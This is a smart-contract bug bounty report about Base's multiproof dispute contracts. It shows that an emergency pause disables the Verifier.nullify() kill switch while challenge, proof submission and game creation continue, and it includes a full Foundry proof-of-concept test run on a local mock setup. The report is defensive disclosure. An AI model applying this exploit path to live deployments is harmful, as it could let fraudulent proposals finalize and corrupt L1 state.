# 74604 sc low system pause disables verifier kill switch allowing unchecked dispute progression

Submitted on Apr 23rd 2026 at 18:46:24 UTC by @magtentic for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74604
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Circumventing the dispute/challenge mechanism to prevent correction of an invalid proposal before finalization

## Description

### Brief/Intro

During an emergency pause, dispute games are marked “improper,” which disables `Verifier.nullify()`. However, dispute entry points (`initializeWithInitData`, `verifyProposalProof`, `challenge`) do not check the pause state. An attacker can keep submitting fraudulent games or proofs while paused, and the global kill-switch (`nullify`) will revert until unpause. Thus the pause intended to stop activity actually blocks the defender’s ability to nullify dishonest games.

### Vulnerability Details

`Verifier.nullify()` requires the caller game to satisfy `ANCHOR_STATE_REGISTRY.isGameProper(...)` and `isGameRespected(...)`.

```solidity
    function nullify() external override {
        if (
            !ANCHOR_STATE_REGISTRY.isGameProper(IDisputeGame(msg.sender))
                || !ANCHOR_STATE_REGISTRY.isGameRespected(IDisputeGame(msg.sender))
        ) revert NotProperGame();
...
```

In `AnchorStateRegistry.isGameProper`, one condition is `if (paused()) return false;`.

```solidity
    function isGameProper(IDisputeGame _game) public view returns (bool) {
...
        // Must not be paused, temporarily causes game to be considered improper.
        if (paused()) {
            return false;
        }
```

Thus, when the system is paused, *all* games are “not proper,” and any `nullify()` call reverts `NotProperGame()`.

Meanwhile, functions like `challenge()` or `verifyProposalProof()` have no `whenNotPaused` guard (no `paused()` check is present), so attackers can continue to challenge or submit proofs during the pause.

In effect, the automated defense is disabled exactly when it’s needed. Once the pause is lifted, the malicious games become “proper” again and can finalize unless manually blacklisted.

Pausing is a normal protocol operation, but the attack does not rely on triggering the pause. The issue is that once the system is legitimately paused, unprivileged users can still submit new games and proofs, while `nullify()` is disabled by the same pause state.

### Impact Details

This allows an attacker to exploit a paused system window: if a prover (or enclave) is compromised or a proof scheme is broken resulting in a pause, the attacker can continuously create malicious games during pause. Legitimate players cannot pause these games via `nullify()`.

After unpausing, these games might lead to invalid finalization or forced anchor updates.

The impact is a bypass of intended emergency protections, an in-scope “circumventing dispute/challenge mechanism” scenario, potentially with serious downstream consequences on L1 state.

### References

[Verifier](https://github.com/base/contracts/blob/v8.1.0/src/multiproof/Verifier.sol)\
[AnchorStateRegistry](https://github.com/base/contracts/blob/v8.1.0/src/dispute/AnchorStateRegistry.sol)

The `nullify()` function checks `isGameProper(...)` and `isGameRespected(...)`.

In the AnchorStateRegistry, `isGameProper(...)` returns false if `paused() == true`.

Note that `closeGame()` explicitly checks `paused()` and reverts (as intended),

```solidity
    function closeGame() external {
        // We won't close the game if the system is currently paused.
        if (ANCHOR_STATE_REGISTRY.paused()) {
            revert GamePaused();
        }
...
```

but `challenge()` (the dispute path) has no such pause check.

Pausing is part of the normal processes as part of the contract and requires no attack path

## Proof of Concept

Copy the below PoC to `test/VerifierPauseKillSwitch.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { Test } from "forge-std/Test.sol";

import { AnchorStateRegistry } from "src/dispute/AnchorStateRegistry.sol";
import { DelayedWETH } from "src/dispute/DelayedWETH.sol";
import { DisputeGameFactory } from "src/dispute/DisputeGameFactory.sol";
import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IDisputeGameFactory } from "interfaces/dispute/IDisputeGameFactory.sol";
import { ISystemConfig } from "interfaces/L1/ISystemConfig.sol";
import { Claim, GameStatus, GameType, Hash, Proposal } from "src/dispute/lib/Types.sol";

import { ProxyAdmin } from "src/universal/ProxyAdmin.sol";
import { TransparentUpgradeableProxy } from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";
import { Verifier } from "src/multiproof/Verifier.sol";
import { MockVerifier } from "src/multiproof/mocks/MockVerifier.sol";

contract PausableMockSystemConfig {
    address public guardian;
    bool internal _paused;

    constructor() {
        guardian = msg.sender;
    }

    function paused() external view returns (bool) {
        return _paused;
    }

    function setPaused(bool paused_) external {
        _paused = paused_;
    }
}

contract VerifierPauseKillSwitch is Test {
    GameType internal constant AGGREGATE_VERIFIER_GAME_TYPE = GameType.wrap(621);
    uint256 internal constant L2_CHAIN_ID = 8453;
    uint256 internal constant BLOCK_INTERVAL = 100;
    uint256 internal constant INTERMEDIATE_BLOCK_INTERVAL = 10;
    uint256 internal constant INIT_BOND = 1 ether;
    uint256 internal constant DELAYED_WETH_DELAY = 1 days;
    uint256 internal constant FINALITY_DELAY = 0 days;
    uint256 internal constant PROOF_THRESHOLD = 1;

    address internal immutable TEE_PROVER = makeAddr("tee-prover");
    address internal immutable ZK_PROVER = makeAddr("zk-prover");

    bytes32 internal immutable TEE_IMAGE_HASH = keccak256("tee-image");
    bytes32 internal immutable ZK_RANGE_HASH = keccak256("zk-range");
    bytes32 internal immutable ZK_AGGREGATE_HASH = keccak256("zk-aggregate");
    bytes32 internal immutable CONFIG_HASH = keccak256("config");

    uint256 internal currentL2BlockNumber;

    ProxyAdmin internal proxyAdmin;
    PausableMockSystemConfig internal systemConfig;
    DisputeGameFactory internal factory;
    AnchorStateRegistry internal anchorStateRegistry;
    DelayedWETH internal delayedWETH;
    MockVerifier internal teeVerifier;
    MockVerifier internal zkVerifier;

    function setUp() public {
        systemConfig = new PausableMockSystemConfig();

        AnchorStateRegistry anchorStateRegistryImpl = new AnchorStateRegistry(FINALITY_DELAY);
        DelayedWETH delayedWETHImpl = new DelayedWETH(DELAYED_WETH_DELAY);
        DisputeGameFactory factoryImpl = new DisputeGameFactory();

        proxyAdmin = new ProxyAdmin(address(this));

        anchorStateRegistry = AnchorStateRegistry(
            address(new TransparentUpgradeableProxy(address(anchorStateRegistryImpl), address(proxyAdmin), ""))
        );
        delayedWETH = DelayedWETH(
            payable(address(new TransparentUpgradeableProxy(address(delayedWETHImpl), address(proxyAdmin), "")))
        );
        factory = DisputeGameFactory(
            address(new TransparentUpgradeableProxy(address(factoryImpl), address(proxyAdmin), ""))
        );

        teeVerifier = new MockVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));
        zkVerifier = new MockVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));

        anchorStateRegistry.initialize(
            ISystemConfig(address(systemConfig)),
            IDisputeGameFactory(address(factory)),
            Proposal({root: Hash.wrap(keccak256(abi.encode(currentL2BlockNumber))), l2SequenceNumber: currentL2BlockNumber}),
            GameType.wrap(0)
        );
        delayedWETH.initialize(ISystemConfig(address(systemConfig)));
        factory.initialize(address(this));

        AggregateVerifier aggregateVerifierImpl = new AggregateVerifier(
            AGGREGATE_VERIFIER_GAME_TYPE,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWETH))),
            IVerifier(address(teeVerifier)),
            IVerifier(address(zkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            PROOF_THRESHOLD
        );
        factory.setImplementation(AGGREGATE_VERIFIER_GAME_TYPE, IDisputeGame(address(aggregateVerifierImpl)));
        factory.setInitBond(AGGREGATE_VERIFIER_GAME_TYPE, INIT_BOND);
        anchorStateRegistry.setRespectedGameType(AGGREGATE_VERIFIER_GAME_TYPE);

        vm.warp(block.timestamp + 1);
    }

    function test_pause_disables_verifier_killswitch_but_not_game_progression() public {
        currentL2BlockNumber += BLOCK_INTERVAL;
        systemConfig.setPaused(true);

        assertTrue(anchorStateRegistry.paused(), "registry should observe pause");

        Claim pausedRootClaim1 = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "paused-root-1")));
        AggregateVerifier game1 = _createAggregateVerifierGame(
            TEE_PROVER,
            pausedRootClaim1,
            currentL2BlockNumber,
            address(anchorStateRegistry),
            _generateProof("tee-proof-1", AggregateVerifier.ProofType.TEE)
        );

        assertEq(factory.gameCount(), 1, "factory still created a new game while paused");
        assertFalse(anchorStateRegistry.isGameProper(IDisputeGame(address(game1))), "paused game should be improper");
        assertFalse(teeVerifier.nullified(), "TEE verifier should start live");

        Claim refutingClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "refuting-root")));
        vm.expectRevert(Verifier.NotProperGame.selector);
        game1.nullify(
            _generateProof("tee-nullify", AggregateVerifier.ProofType.TEE),
            BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1,
            refutingClaim.raw()
        );
        assertFalse(teeVerifier.nullified(), "pause blocked the verifier kill-switch");

        Claim challengeClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "challenge-root")));
        vm.prank(ZK_PROVER);
        game1.challenge(
            _generateProof("zk-challenge", AggregateVerifier.ProofType.ZK),
            BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1,
            challengeClaim.raw()
        );
        assertEq(game1.proofCount(), 2, "challenge still added the ZK proof during pause");

        Claim pausedRootClaim2 = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "paused-root-2")));
        AggregateVerifier game2 = _createAggregateVerifierGame(
            TEE_PROVER,
            pausedRootClaim2,
            currentL2BlockNumber,
            address(anchorStateRegistry),
            _generateProof("tee-proof-2", AggregateVerifier.ProofType.TEE)
        );

        vm.prank(ZK_PROVER);
        game2.verifyProposalProof(_generateProof("zk-proof-2", AggregateVerifier.ProofType.ZK));
        assertEq(game2.proofCount(), 2, "verifyProposalProof still succeeds during pause");
        assertFalse(anchorStateRegistry.isGameProper(IDisputeGame(address(game2))), "paused game remains improper only temporarily");

        systemConfig.setPaused(false);
        assertTrue(anchorStateRegistry.isGameProper(IDisputeGame(address(game1))), "game1 becomes proper again after unpause");
        assertTrue(anchorStateRegistry.isGameProper(IDisputeGame(address(game2))), "game2 becomes proper again after unpause");

        vm.warp(block.timestamp + 1 days);
        game2.resolve();
        assertEq(uint8(game2.status()), uint8(GameStatus.DEFENDER_WINS), "paused-window game remains usable after unpause");
    }

    function _createAggregateVerifierGame(
        address creator,
        Claim rootClaim,
        uint256 l2BlockNumber,
        address parentAddress,
        bytes memory proof
    )
        internal
        returns (AggregateVerifier game)
    {
        bytes memory intermediateRoots = abi.encodePacked(_generateIntermediateRootsExceptLast(l2BlockNumber), rootClaim.raw());
        bytes memory extraData = abi.encodePacked(uint256(l2BlockNumber), parentAddress, intermediateRoots);

        vm.deal(creator, INIT_BOND);
        vm.prank(creator);
        return AggregateVerifier(
            address(factory.createWithInitData{ value: INIT_BOND }(AGGREGATE_VERIFIER_GAME_TYPE, rootClaim, extraData, proof))
        );
    }

    function _generateProof(bytes memory salt, AggregateVerifier.ProofType proofType) internal view returns (bytes memory) {
        bytes32 l1OriginHash = blockhash(block.number - 1);
        uint256 l1OriginNumber = block.number - 1;
        bytes memory signature = abi.encodePacked(salt, bytes32(0), bytes32(0), uint8(27));
        return abi.encodePacked(uint8(proofType), l1OriginHash, l1OriginNumber, signature);
    }

    function _generateIntermediateRootsExceptLast(uint256 l2BlockNumber) internal pure returns (bytes memory) {
        bytes memory intermediateRoots;
        uint256 startingL2BlockNumber = l2BlockNumber - BLOCK_INTERVAL;
        for (uint256 i = 1; i < BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL; i++) {
            intermediateRoots = abi.encodePacked(
                intermediateRoots,
                keccak256(abi.encode(startingL2BlockNumber + INTERMEDIATE_BLOCK_INTERVAL * i))
            );
        }
        return intermediateRoots;
    }
}
```

Run the below to execute

```bash
forge test --match-contract VerifierPauseKillSwitch -vvvv
```
